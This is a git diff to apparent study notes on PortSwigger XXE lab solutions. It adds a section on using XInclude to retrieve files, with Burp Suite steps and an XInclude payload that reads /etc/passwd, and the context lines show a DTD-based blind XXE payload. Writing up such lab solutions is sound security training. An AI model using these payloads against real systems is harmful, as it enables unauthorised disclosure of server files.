@@ -10,6 +10,7 @@
 - [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
 - [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
 - [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
+- [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
 
 ## Exploiting XXE using external entities to retrieve files
 Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
@@ -115,3 +116,14 @@ When imported, this page will read the contents of ``/etc/passwd`` into the ``fi
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 ```
 You should see an error message containing the contents of the ``/etc/passwd`` file.
+
+## Exploiting XInclude to retrieve files
+Reference: 
+
+<!-- omit in toc -->
+### Solution
+1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+2. Set the value of the ``productId`` parameter to:
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
